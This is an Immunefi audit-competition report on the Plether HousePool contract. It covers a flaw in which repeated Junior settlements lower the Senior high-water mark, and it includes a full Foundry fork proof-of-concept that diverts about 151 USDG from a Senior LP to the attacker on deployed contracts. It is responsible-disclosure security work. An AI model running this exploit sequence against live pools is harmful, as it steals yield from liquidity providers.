# \#99759 [SC-High] Repeated claimant reservation lowers the Senior high-water mark and diverts later return

**Submitted on Nov 15th 2026 at 05:54:11 UTC by @unineko for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99759
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Theft of unclaimed yield

## Description

## Summary

**Severity: High — theft of unclaimed yield under the [Plether competition scope](https://immunefi.com/audit-competition/plether/scope/).** After a legitimate owner recapitalizes a cash-short Pool, a zero funded Junior settlement can leave a carried recapitalization bucket. A second processed Junior settlement reserves that bucket against equity already assigned to Senior, lowering Senior's high-water mark (HWM) without new Pool cash, a claim change, or a Senior redemption. In the matched deployed-v2 fork, the Senior victim later fully exits with a **151.066807 USDG realized wallet shortfall** against the one-pass control; the Junior claimant receives **150.821166 USDG** in its wallet from the redirected return.

## Finding Description

At commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`, [`HousePool._reconcile()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1562-L1598) passes pending claimant buckets to [`_settleablePendingClaimantBuckets()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L1829-L1834). The helper caps a carried recapitalization bucket against full terminal distributable equity, including equity already assigned to Senior in the prior reconciliation. [`HousePoolReconcilePlanLib.planReconcile()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolReconcilePlanLib.sol#L68-L75) subtracts that bucket again before comparing equity to stored principal. This temporarily wipes tranche principal; [`applyClaimantRecapitalizationIntent()`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/HousePoolPendingPreviewLib.sol#L111-L136) then takes its empty-bootstrap branch and replaces the existing Senior HWM with the lower residual recap target.

Let `G = aggregate trader claim − Pool cash > 0` before owner recapitalization, and let `R` be the owner's recapitalization payment. In the PoC's clean state, with wiped pre-recap principal and no other terminal obligations, first-pass distributable equity is `R − G`. A second pass fully re-reserves that equity and enters the HWM-reset branch when **`G < R ≤ 2G`**. The PoC uses **`R = 2G`**:

1. Public V3 fills leave a **132,943.879031 USDG** trader claim against **113,971.612143 USDG** Pool cash, so `G = 18,972.266888 USDG`. A separate owner legitimately calls `recapitalizePool` for `R = 37,944.533776 USDG` and clears degraded mode so LP settlement can proceed.
2. The first processed, zero funded Junior settlement assigns `G` to Senior principal, sets Senior HWM to `R`, and carries `G` of pending recapitalization.
3. The Junior holder claims the refunded shares, waits the cooldown, and requests another mature exit. Its second zero funded settlement processes that Junior epoch. Cash, claim, and Senior principal remain unchanged, but the HWM falls from `R` to `G` and the pending bucket clears. A bare settlement with no processable epoch would revert `HousePool__NoLpEpochProgress` and commit no HWM change.
4. A separate trader later loses USDG to the Pool. The one-pass control restores Senior toward HWM `R`; the two-pass branch instead allocates that return to Junior under HWM `G`. The PoC then funds the Senior victim's full exit, which releases Junior redemption capacity under the deployed **80% Senior share cap**, and compares wallet receipts.

The [waterfall specification](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L329-L340) preserves Senior HWM through losses and routes surplus to Senior restoration before Junior. The [partial-recap regression](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/test/perps/accounting/waterfall/HousePoolWaterfall.t.sol#L177-L220) expects the first pass to retain the full recap target while carrying a residual. A second pass without new cash or a changed claim should preserve that target.

This is incomplete residual-carry behavior in the fix for [SC Audit Studio SC-L1](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-pre-audit-report.pdf#page=32) and [PR #29](https://github.com/Plether-Fi/plether-core/pull/29). That finding concerned one-pass raw-principal overstatement after an uncapped claimant bucket and a zero-value **Senior** withdrawal; PR #29 added a cap and residual carry. Here the **carried residual** is reserved again on a second **Junior** settlement with unchanged cash and claim, lowering HWM before any Senior redemption and redirecting a later realized return. Cecuro MED-11 and MED-12 ([prior report](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/plether-ai-audit-report-2026-10-26.pdf#page=31)) instead concern HWM scaling on an actual Senior redemption and same-batch recap/revenue continuation, respectively.

## Impact Explanation

After the same later trading return, the Senior victim receives **18,971.252001 USDG** in the two-pass branch versus **19,122.318808 USDG** in the one-pass control. It fully exits with no wallet shares or pending, refundable, or claimable rights in either branch, so the **151.066807 USDG wallet shortfall is realized**. Its initial **18,800 USDG** deposit remains covered; the shortfall is allocation of later Pool return. The independent trader contributes **151.074888 USDG** of new Pool cash in the attack branch, with the control within **0.001 USDG**.

The Junior claimant receives **150.821166 USDG** in the two-pass branch versus zero in the control. The control's refundable Junior shares have **zero current NAV**; the two-pass branch also leaves claimant pending shares with **0.253328 USDG current NAV**, not yet claimable cash. These are matched-checkpoint wallet and share values, not a claim of lifetime attacker net profit after earlier deposits, trades, fees, or future share value changes. The small wallet difference remains in tranche backing.

## Likelihood Explanation

This path requires a claim exceeding Pool cash, a separate legitimate owner recapitalization in the stated range, a processed second zero funded Junior epoch, later trading return, and sufficient Junior withdrawal capacity. The PoC's degraded state also requires the owner to call `clearDegradedMode()` after `recapitalizePool`. The claimant can make the second epoch by refunding and re-requesting Junior shares, but cannot compel the owner recovery or the independent trader return. Under the deployed 80% Senior share cap, the approximately 151 USDG Junior allocation cannot be paid while Senior exposure remains near `G`; the PoC's independent Senior victim fully exits to make that payout possible. The Pool reads aggregate trader claims, so the claimant and Junior LP need not be the same address; the fork uses one address for both. The fork uses deterministic external `MockPyth` updates with a synthetic six-feed move from approximately `0.9` to `1.6`; a corresponding live market path is a condition for execution.

## Recommendation

Track whether a pending claimant recap is newly funded or is a residual already assigned during an earlier reconciliation. Reserve any unbacked residual without subtracting assigned Senior equity again, and preserve the Senior HWM when cash, claims, and tranche ownership have not changed. A regression should repeat the processed zero funded Junior settlement and verify that the same later trader loss restores Senior before Junior in both histories.


## Proof of Concept

## Proof of Concept

The standalone [Finding 12 fork PoC](../../packages/perps/test/perps/finding12_poc.t.sol) pins the activated Arbitrum Sepolia v2.0.0 deployment at block `323664344`, checks deployed code hashes, and uses public Router/Vault/Pool calls. Only the external Pyth endpoint is mocked; the release's mintable test USDG funds actors, and a local ArbSys shim supplies L2 block-number semantics. The test snapshots after the first settlement, compares a second processed zero funded Junior settlement to a one-pass control, and checks unchanged cash/claim alongside the changed HWM and final wallet receipts. It also asserts that the Senior victim retains no residual rights, the control Junior shares have zero current NAV, the attack Junior pending shares have 0.253328 USDG current NAV, and trader claims are equal across branches. From `packages/perps`, run with an archive-capable RPC:

```sh
FINDING12_FORK_RPC_URL=https://arbitrum-sepolia.gateway.tenderly.co forge test --match-path test/perps/finding12_poc.t.sol -vv
```

Verified fork result: `Finding12ForkPoC.testFinding12_RepeatedClaimantReserveDivertsSeniorYield` passed (1/1; 0 failed).

Selected verified output (six-decimal USDG atoms):

```text
[PASS] testFinding12_RepeatedClaimantReserveDivertsSeniorYield()
Logs:
  Senior own deposit: 18800000000
  fresh trader loss paid to Pool: 151074888
  Senior actual wallet in two-pass attack: 18971252001
  Senior actual wallet in one-pass control: 19122318808
  Senior wallet shortfall: 151066807
  Junior actual wallet in two-pass attack: 150821166
  Junior actual wallet in one-pass control: 0
  Junior current NAV in two-pass attack: 253328
  Junior current NAV in one-pass control: 0
Suite result: ok. 1 passed; 0 failed; 0 skipped
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {CfdEngine} from "@plether/perps/CfdEngine.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {ArbitrumForkSupport} from "@plether/test-utils/ArbitrumForkSupport.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {Test} from "forge-std/Test.sol";

interface IFinding12USDG is IERC20 {

    function mint(
        address to,
        uint256 amount
    ) external;

}

/// @notice A second empty Junior settlement re-reserves carried claimant recap,
///         lowers Senior HWM, and routes later Pool return to Junior.
/// @dev From packages/perps:
///      FOUNDRY_TEST=test/perps FINDING12_FORK_RPC_URL=https://arbitrum-sepolia.gateway.tenderly.co forge test \
///        --match-path test/perps/finding12_poc.t.sol -vv --ignored-error-codes 6335 \
///        -o /tmp/plether-f12-out --cache-path /tmp/plether-f12-cache
contract Finding12ForkPoC is Test {

    address private constant OWNER = 0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B;
    address private constant USDG = 0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D;
    address private constant ENGINE = 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA;
    address private constant POOL = 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e;
    address private constant SENIOR_VAULT = 0x5Dc42Ba5a1E8DD3E1B6868D10f66A9bf8Fb5B83d;
    address private constant JUNIOR_VAULT = 0x4A8b67184a1E3224c11A191cc69F22C50EEf734e;
    address private constant ROUTER = 0x918663D6Da8CB33b325a04c4A5e8c51D42F3b444;
    address private constant ORACLE = 0x4f2c62A0E03657F52C633c19c11f88d8F0897Bb2;
    address private constant CLEARINGHOUSE = 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A;

    bytes32 private constant ENGINE_CODEHASH = 0xa0f8e5be6e622a5a83e46e88f6b012757ef924cf613a50cba52a2b5c66b76a6b;
    bytes32 private constant POOL_CODEHASH = 0x5e684cc82bfc5b697a24c80ef26910cfbe25efbe6fb2ca184c421808b5ced957;
    bytes32 private constant SENIOR_CODEHASH = 0x1ef72eae70097e0207bbe8b4399d0b0e79910c40d6665a42f2c933b037355d8a;
    bytes32 private constant JUNIOR_CODEHASH = 0x8d00d3d0273b7a321cbf61232ea79ef0b503fe0d83bb52609321765a0a04f3bf;
    bytes32 private constant ROUTER_CODEHASH = 0x6c65de67ef2824572537e3641a71100100c49d909b196c43e5d271312534d3cf;
    bytes32 private constant ORACLE_CODEHASH = 0x1ecb1ca760e7ba51d958697eeefe06ff7ba1a3ad162b3e7978af3df30393bc13;
    bytes32 private constant CLEARINGHOUSE_CODEHASH =
        0xc8e4965893dbd7073303303e9d5ab9c775aabcc1259635e4993fc7fdb0681398;
    bytes32 private constant USDG_CODEHASH = 0x12233a5f6b0abf6a0f8447e56f9507afdd142a78cc42ebb0d041a3997bd299f6;

    uint256 private constant FORK_BLOCK = 323_664_344;
    uint256 private constant START = 1_795_435_200;
    uint256 private constant PYTH_FEE = 1 gwei;
    uint256 private constant SENIOR_INPUT = 18_800e6;
    uint256 private constant JUNIOR_INPUT = 381_198e6;

    address private constant ATTACKER = address(0xA771);
    address private constant SENIOR_VICTIM = address(0xA881);
    address private constant PAID_TRADER = address(0xB0B);
    address private constant LONG_TRADER = address(0xA11CE);
    address private constant LOSING_TRADER = address(0xD0D);

    IFinding12USDG private usdg;
    CfdEngine private engine;
    HousePool private pool;
    TrancheVault private seniorVault;
    TrancheVault private juniorVault;
    MarginClearinghouse private clearinghouse;
    OrderRouter private router;
    PletherOracle private oracle;
    MockPyth private pyth;

    struct Payout {
        uint256 senior;
        uint256 junior;
        uint256 revenue;
        uint256 juniorPendingShares;
        uint256 juniorRefundableShares;
        uint256 juniorCurrentNav;
        uint256 totalTraderClaims;
        uint256 attackerTraderClaim;
    }

    function setUp() public {
        vm.createSelectFork(
            vm.envOr("FINDING12_FORK_RPC_URL", string("https://arbitrum-sepolia.gateway.tenderly.co")), FORK_BLOCK
        );
        assertEq(block.chainid, 421_614, "Arbitrum Sepolia fork required");
        assertEq(ENGINE.codehash, ENGINE_CODEHASH, "unexpected v2.0.0 Engine");
        assertEq(POOL.codehash, POOL_CODEHASH, "unexpected v2.0.0 Pool");
        assertEq(SENIOR_VAULT.codehash, SENIOR_CODEHASH, "unexpected v2.0.0 Senior Vault");
        assertEq(JUNIOR_VAULT.codehash, JUNIOR_CODEHASH, "unexpected v2.0.0 Junior Vault");
        assertEq(ROUTER.codehash, ROUTER_CODEHASH, "unexpected v2.0.0 Router");
        assertEq(ORACLE.codehash, ORACLE_CODEHASH, "unexpected v2.0.0 Oracle");
        assertEq(CLEARINGHOUSE.codehash, CLEARINGHOUSE_CODEHASH, "unexpected v2.0.0 Clearinghouse");
        assertEq(USDG.codehash, USDG_CODEHASH, "unexpected release Mock USDG");
        ArbitrumForkSupport.install();

        usdg = IFinding12USDG(USDG);
        engine = CfdEngine(payable(ENGINE));
        pool = HousePool(payable(POOL));
        seniorVault = TrancheVault(SENIOR_VAULT);
        juniorVault = TrancheVault(JUNIOR_VAULT);
        clearinghouse = MarginClearinghouse(CLEARINGHOUSE);
        router = OrderRouter(payable(ROUTER));
        oracle = PletherOracle(payable(ORACLE));
        assertEq(address(router.pletherOracle()), ORACLE);
        assertEq(engine.owner(), OWNER);
        assertEq(pool.totalAssets(), 2e6, "release seeds only");
        assertEq(pool.seniorPrincipal(), 1e6);
        assertEq(pool.juniorPrincipal(), 1e6);
        assertEq(pool.seniorHighWaterMark(), 1e6);
        assertEq(pool.pendingRecapitalizationAssets(), 0);
        assertEq(engine.totalTraderClaimBalanceAssets(), 0);
        assertEq(pool.maxSeniorShareBps(), 8000);
        assertEq(router.globalTailOrderId(), 0, "no pending global order tail");

        address pythAddress = address(oracle.pyth());
        MockPyth mockImplementation = new MockPyth();
        vm.etch(pythAddress, address(mockImplementation).code);
        pyth = MockPyth(pythAddress);
        pyth.setFee(PYTH_FEE);
        vm.deal(address(this), 100 ether);
        vm.warp(START);
        vm.roll(block.number + 1);
        router.updateMarkPrice{value: PYTH_FEE}(
            _sixPayload(1e8, uint64(vm.getBlockTimestamp()), uint64(vm.getBlockTimestamp() - 1))
        );
        assertApproxEqAbs(engine.lastMarkPrice(), 1e8, 5);

        uint256 juniorDeposit = _requestDeposit(juniorVault, ATTACKER, JUNIOR_INPUT);
        _activateDeposit(juniorVault, ATTACKER, juniorDeposit);
        uint256 seniorDeposit = _requestDeposit(seniorVault, SENIOR_VICTIM, SENIOR_INPUT);
        _activateDeposit(seniorVault, SENIOR_VICTIM, seniorDeposit);
        assertEq(pool.totalAssets(), 400_000e6);
    }

    function testFinding12_RepeatedClaimantReserveDivertsSeniorYield() public {
        uint256 started = vm.getBlockTimestamp();
        _fundTrader(LONG_TRADER, 100_000e6);
        _fundTrader(PAID_TRADER, 100_000e6);
        _fundTrader(ATTACKER, 100_000e6);

        _submitAt(PAID_TRADER, CfdTypes.Side.SHORT, 170_000e18, 30_000e6, 90_000_000, false);
        _submitAt(LONG_TRADER, CfdTypes.Side.LONG, 248_000e18, 50_000e6, 160_000_000, false);
        _submitAt(ATTACKER, CfdTypes.Side.SHORT, 190_000e18, 30_000e6, 90_000_000, false);
        _submitAt(LONG_TRADER, CfdTypes.Side.LONG, 248_000e18, 0, 90_000_000, true);
        _submitAt(PAID_TRADER, CfdTypes.Side.SHORT, 170_000e18, 0, 160_000_000, true);
        _submitAt(ATTACKER, CfdTypes.Side.SHORT, 190_000e18, 0, 160_000_000, true);

        uint256 claim = engine.traderClaimBalanceAssets(ATTACKER);
        uint256 cashBeforeRecap = pool.totalAssets();
        assertGt(claim, cashBeforeRecap, "actual claim exceeds Pool cash");
        assertEq(engine.totalTraderClaimBalanceAssets(), claim);
        uint256 gap = claim - cashBeforeRecap;
        emit log_named_uint("cash-short claim", claim);
        emit log_named_uint("Pool cash before recap", cashBeforeRecap);
        emit log_named_uint("claim cash gap", gap);
        emit log_named_uint("claim setup duration seconds", vm.getBlockTimestamp() - started);

        uint256 firstJuniorRequest = _queueFullJuniorExit();
        usdg.mint(OWNER, 2 * gap);
        vm.startPrank(OWNER);
        usdg.approve(ENGINE, 2 * gap);
        engine.recapitalizePool(2 * gap);
        if (engine.degradedMode()) {
            engine.clearDegradedMode();
        }
        vm.stopPrank();

        IHousePool.LpEpochSettlementResult memory first = pool.settleLpEpoch(0, 0);
        assertEq(first.juniorProcessedEpochs, 1);
        assertEq(first.juniorFundedAssets, 0);
        assertEq(pool.seniorPrincipal(), gap);
        assertEq(pool.seniorHighWaterMark(), 2 * gap);
        assertEq(pool.pendingRecapitalizationAssets(), gap);
        uint256 preRevenueEstimate = seniorVault.estimateRedeemAssets(seniorVault.balanceOf(SENIOR_VICTIM));
        assertGt(preRevenueEstimate, SENIOR_INPUT, "victim already above its own cost basis");
        uint256 snapshot = vm.snapshotState();

        Payout memory attack = _attackBranch(firstJuniorRequest, claim, gap);
        assertTrue(vm.revertToState(snapshot));
        Payout memory control = _controlBranch(firstJuniorRequest, gap);

        assertApproxEqAbs(attack.revenue, control.revenue, 1000, "same fresh trader revenue");
        assertGt(attack.revenue, 20e6);
        assertGt(attack.senior, SENIOR_INPUT, "victim still above own deposit");
        assertGt(control.senior, attack.senior, "Senior receives less actual USDG");
        assertEq(control.junior, 0, "one-pass Junior receives no USDG");
        assertGt(attack.junior, 150e6, "Junior receives actual Vault payout");
        assertGt(control.senior - attack.senior, 150e6, "Senior loses material actual cash");
        assertGt(control.senior, preRevenueEstimate, "control routes fresh return to Senior");
        assertApproxEqAbs(attack.senior, preRevenueEstimate, 100_000, "attack withholds fresh Senior return");
        assertApproxEqAbs(control.senior - attack.senior, attack.revenue, 100_000, "Senior loses later return");
        assertApproxEqAbs(
            attack.junior, control.senior - attack.senior, 500_000, "actual wallet transfer tracks shortfall"
        );
        assertEq(attack.junior, 150_821_166, "attack Junior actual USDG receipt");
        assertGt(attack.juniorPendingShares, 0, "attack Junior retains pending shares");
        assertEq(attack.juniorRefundableShares, 0, "attack Junior has no refundable shares");
        assertApproxEqAbs(attack.juniorCurrentNav, 253_328, 1000, "attack Junior remaining current NAV");
        assertEq(control.juniorPendingShares, 0, "control Junior has no pending shares");
        assertGt(control.juniorRefundableShares, 0, "control Junior shares are refundable");
        assertEq(control.juniorCurrentNav, 0, "control Junior refundable shares have zero current NAV");
        assertGt(
            attack.junior + attack.juniorCurrentNav,
            control.junior + control.juniorCurrentNav + 149e6,
            "attack Junior gains over 149 USDG of current cash plus recognized NAV"
        );
        assertEq(attack.totalTraderClaims, control.totalTraderClaims, "same aggregate trader claims");
        assertEq(attack.attackerTraderClaim, control.attackerTraderClaim, "same attacker trader claim");

        emit log_named_uint("Senior own deposit", SENIOR_INPUT);
        emit log_named_uint("Senior pre-revenue redeem estimate", preRevenueEstimate);
        emit log_named_uint("fresh trader loss paid to Pool", attack.revenue);
        emit log_named_uint("Senior actual wallet in two-pass attack", attack.senior);
        emit log_named_uint("Senior actual wallet in one-pass control", control.senior);
        emit log_named_uint("Senior wallet shortfall", control.senior - attack.senior);
        emit log_named_uint("Junior actual wallet in two-pass attack", attack.junior);
        emit log_named_uint("Junior actual wallet in one-pass control", control.junior);
        emit log_named_uint("Junior current NAV in two-pass attack", attack.juniorCurrentNav);
        emit log_named_uint("Junior current NAV in one-pass control", control.juniorCurrentNav);
    }

    function _attackBranch(
        uint256 firstRequest,
        uint256 claim,
        uint256 gap
    ) private returns (Payout memory out) {
        uint256 cashBeforeSecond = pool.totalAssets();
        vm.prank(ATTACKER);
        assertGt(juniorVault.claimRedeemRefund(firstRequest, ATTACKER, ATTACKER), 0);
        uint256 secondRequest = _queueFullJuniorExit();
        IHousePool.LpEpochSettlementResult memory second = pool.settleLpEpoch(0, 0);
        assertEq(second.juniorProcessedEpochs, 1);
        assertEq(second.juniorFundedAssets, 0);
        assertEq(pool.seniorPrincipal(), gap, "no Senior principal paid in bad pass");
        assertEq(pool.seniorHighWaterMark(), gap, "bad pass erases recovery HWM");
        assertEq(pool.pendingRecapitalizationAssets(), 0);
        assertEq(pool.totalAssets(), cashBeforeSecond, "second pass adds no Pool cash");
        assertEq(engine.traderClaimBalanceAssets(ATTACKER), claim, "claim unchanged");

        out.revenue = _freshTraderLoss();
        vm.prank(ATTACKER);
        assertGt(juniorVault.claimRedeemRefund(secondRequest, ATTACKER, ATTACKER), 0);
        uint256 juniorRequest = _queueFullJuniorExit();
        uint256 seniorRequest = _queueFullSeniorExit();
        pool.settleLpEpoch(0, 0);
        out.senior = _claimSenior(seniorRequest);
        out.junior = _claimJunior(juniorRequest);
        out = _captureFinalState(out, seniorRequest, juniorRequest);
    }

    function _controlBranch(
        uint256 firstRequest,
        uint256 gap
    ) private returns (Payout memory out) {
        assertEq(pool.seniorHighWaterMark(), 2 * gap);
        vm.prank(ATTACKER);
        assertGt(juniorVault.claimRedeemRefund(firstRequest, ATTACKER, ATTACKER), 0);
        out.revenue = _freshTraderLoss();
        uint256 juniorRequest = _queueFullJuniorExit();
        uint256 seniorRequest = _queueFullSeniorExit();
        pool.settleLpEpoch(0, 0);
        out.senior = _claimSenior(seniorRequest);
        out.junior = _claimJunior(juniorRequest);
        out = _captureFinalState(out, seniorRequest, juniorRequest);
    }

    function _captureFinalState(
        Payout memory out,
        uint256 seniorRequest,
        uint256 juniorRequest
    ) private view returns (Payout memory) {
        assertEq(usdg.balanceOf(SENIOR_VICTIM), out.senior, "Senior wallet contains only the redemption receipt");
        assertEq(seniorVault.balanceOf(SENIOR_VICTIM), 0, "Senior victim has no wallet shares");
        assertEq(seniorVault.pendingRedeemRequest(seniorRequest, SENIOR_VICTIM), 0, "Senior has no pending shares");
        assertEq(
            seniorVault.refundableRedeemRequest(seniorRequest, SENIOR_VICTIM), 0, "Senior has no refundable shares"
        );
        assertEq(seniorVault.claimableRedeemRequest(seniorRequest, SENIOR_VICTIM), 0, "Senior has no claimable shares");
        assertEq(seniorVault.claimableRedeemAssets(seniorRequest, SENIOR_VICTIM), 0, "Senior has no claimable USDG");

        uint256 juniorWalletShares = juniorVault.balanceOf(ATTACKER);
        assertEq(juniorWalletShares, 0, "Junior claimant has no wallet shares");
        out.juniorPendingShares = juniorVault.pendingRedeemRequest(juniorRequest, ATTACKER);
        out.juniorRefundableShares = juniorVault.refundableRedeemRequest(juniorRequest, ATTACKER);
        assertEq(juniorVault.claimableRedeemRequest(juniorRequest, ATTACKER), 0, "Junior has no unclaimed shares");
        assertEq(juniorVault.claimableRedeemAssets(juniorRequest, ATTACKER), 0, "Junior has no unclaimed USDG");
        // Include wallet, escrowed, and refundable shares in the claimant's current recognized NAV.
        out.juniorCurrentNav =
            juniorVault.convertToAssets(juniorWalletShares + out.juniorPendingShares + out.juniorRefundableShares);
        out.totalTraderClaims = engine.totalTraderClaimBalanceAssets();
        out.attackerTraderClaim = engine.traderClaimBalanceAssets(ATTACKER);
        return out;
    }

    function _freshTraderLoss() private returns (uint256 revenue) {
        _fundTrader(LOSING_TRADER, 2000e6);
        uint256 beforeCash = pool.totalAssets();
        _submitAt(LOSING_TRADER, CfdTypes.Side.LONG, 1500e18, 1500e6, 150_000_000, false);
        _submitAt(LOSING_TRADER, CfdTypes.Side.LONG, 1500e18, 0, 160_000_000, true);
        revenue = pool.totalAssets() - beforeCash;
        assertGt(revenue, 20e6);
        assertLt(revenue, 500e6);
    }

    function _fundTrader(
        address trader,
        uint256 amount
    ) private {
        usdg.mint(trader, amount);
        vm.startPrank(trader);
        usdg.approve(CLEARINGHOUSE, amount);
        clearinghouse.deposit(trader, amount);
        vm.stopPrank();
    }

    function _requestDeposit(
        TrancheVault vault,
        address lp,
        uint256 amount
    ) private returns (uint256 id) {
        usdg.mint(lp, amount);
        vm.startPrank(lp);
        usdg.approve(address(vault), amount);
        id = vault.requestDeposit(amount, lp, lp);
        vm.stopPrank();
    }

    function _activateDeposit(
        TrancheVault vault,
        address lp,
        uint256 id
    ) private {
        uint256 activation = pool.lpEpochStart(id);
        if (vm.getBlockTimestamp() < activation) {
            vm.warp(activation);
        }
        vm.roll(vm.getBlockNumber() + 1);
        router.updateMarkPrice{value: PYTH_FEE}(
            _sixPayload(1e8, uint64(vm.getBlockTimestamp()), uint64(vm.getBlockTimestamp() - 1))
        );
        pool.settleLpEpoch(0, 0);
        uint256 assets = vault.claimableDepositRequest(id, lp);
        assertGt(assets, 0);
        vm.prank(lp);
        vault.claimDeposit(id, assets, lp, lp);
    }

    function _queueFullJuniorExit() private returns (uint256 id) {
        uint256 unlock = juniorVault.lastDepositTime(ATTACKER) + juniorVault.DEPOSIT_COOLDOWN();
        if (vm.getBlockTimestamp() < unlock) {
            vm.warp(unlock);
        }
        uint256 shares = juniorVault.maxRequestRedeem(ATTACKER);
        assertGt(shares, 0);
        vm.prank(ATTACKER);
        id = juniorVault.requestRedeem(shares, ATTACKER, ATTACKER);
        uint256 epoch = pool.lpEpochStart(id);
        if (vm.getBlockTimestamp() < epoch) {
            vm.warp(epoch);
        }
    }

    function _queueFullSeniorExit() private returns (uint256 id) {
        uint256 unlock = seniorVault.lastDepositTime(SENIOR_VICTIM) + seniorVault.DEPOSIT_COOLDOWN();
        if (vm.getBlockTimestamp() < unlock) {
            vm.warp(unlock);
        }
        uint256 shares = seniorVault.maxRequestRedeem(SENIOR_VICTIM);
        assertGt(shares, 0);
        vm.prank(SENIOR_VICTIM);
        id = seniorVault.requestRedeem(shares, SENIOR_VICTIM, SENIOR_VICTIM);
        uint256 epoch = pool.lpEpochStart(id);
        if (vm.getBlockTimestamp() < epoch) {
            vm.warp(epoch);
        }
    }

    function _claimSenior(
        uint256 id
    ) private returns (uint256 receipt) {
        uint256 shares = seniorVault.claimableRedeemRequest(id, SENIOR_VICTIM);
        assertGt(shares, 0, "Senior redemption funded");
        uint256 beforeWallet = usdg.balanceOf(SENIOR_VICTIM);
        vm.prank(SENIOR_VICTIM);
        receipt = seniorVault.claimRedeem(id, shares, SENIOR_VICTIM, SENIOR_VICTIM);
        assertEq(usdg.balanceOf(SENIOR_VICTIM) - beforeWallet, receipt);
    }

    function _claimJunior(
        uint256 id
    ) private returns (uint256 receipt) {
        uint256 shares = juniorVault.claimableRedeemRequest(id, ATTACKER);
        if (shares == 0) {
            return 0;
        }
        uint256 beforeWallet = usdg.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        receipt = juniorVault.claimRedeem(id, shares, ATTACKER, ATTACKER);
        assertEq(usdg.balanceOf(ATTACKER) - beforeWallet, receipt);
    }

    function _submitAt(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 basketPrice,
        bool isClose
    ) private {
        vm.warp(vm.getBlockTimestamp() + 28 days);
        vm.roll(vm.getBlockNumber() + 1);
        uint64 observed = uint64(vm.getBlockTimestamp());
        router.updateMarkPrice{value: PYTH_FEE}(_sixPayload(basketPrice, observed, observed - 1));
        _submitOrder(account, side, size, margin, basketPrice, isClose);
    }

    function _submitOrder(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 basketPrice,
        bool isClose
    ) private {
        OrderV3Types.OrderRequest memory request;
        request.clientOrderId =
            keccak256(abi.encode("finding12", account, router.nextCommitId(), vm.getBlockTimestamp(), isClose));
        request.side = side;
        request.sizeDelta = size;
        request.marginDelta = margin;
        request.targetPrice = isClose
            ? (side == CfdTypes.Side.LONG ? type(uint256).max : 1)
            : (side == CfdTypes.Side.LONG ? 1 : type(uint256).max);
        request.isClose = isClose;
        request.bounds = OrderV3Types.ExecutionBounds({
            submitBy: uint64(vm.getBlockTimestamp() + 120),
            executionWindowSeconds: 60,
            allowedExecutionModes: 7,
            expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
            maxExecutionBountyAssets: type(uint256).max,
            maxExecutionNotionalAssets: type(uint256).max,
            maxGrossAccountDebitAssets: type(uint256).max,
            maxActionChargeAssets: type(uint256).max,
            maxExplicitFeesAssets: type(uint256).max,
            maxPostPositionSize: type(uint256).max,
            minPostSettlementBalanceAssets: 0,
            minPostPositionEquityAssets: 0,
            maxPostLeverageBps: type(uint32).max
        });
        vm.prank(account);
        uint64 id = router.commitOrder(request);
        uint64 previous = uint64(vm.getBlockTimestamp());
        vm.warp(vm.getBlockTimestamp() + 1);
        vm.roll(vm.getBlockNumber() + 1);
        OrderV3Types.ExecutionResult memory result = router.executeOrder{value: 2 * PYTH_FEE}(
            id, _sixPayload(basketPrice, uint64(vm.getBlockTimestamp()), previous)
        );
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "public V3 fill");
    }

    function _sixPayload(
        uint256 basketPrice,
        uint64 publish,
        uint64 previous
    ) private view returns (bytes[] memory payload) {
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](6);
        for (uint256 i; i < 6; ++i) {
            uint256 base = oracle.basePrices(i);
            bool inverted = oracle.inversions(i);
            uint256 neutral = inverted ? 1e16 / base : base;
            uint256 raw = inverted ? neutral * 1e8 / basketPrice : neutral * basketPrice / 1e8;
            updates[i] = MockPyth.FeedUpdate(
                oracle.pythFeedIds(i), MockPyth.MockPrice(int64(int256(raw)), 0, -8, publish, previous)
            );
        }
        payload = new bytes[](1);
        payload[0] = abi.encode(updates);
    }

}
```
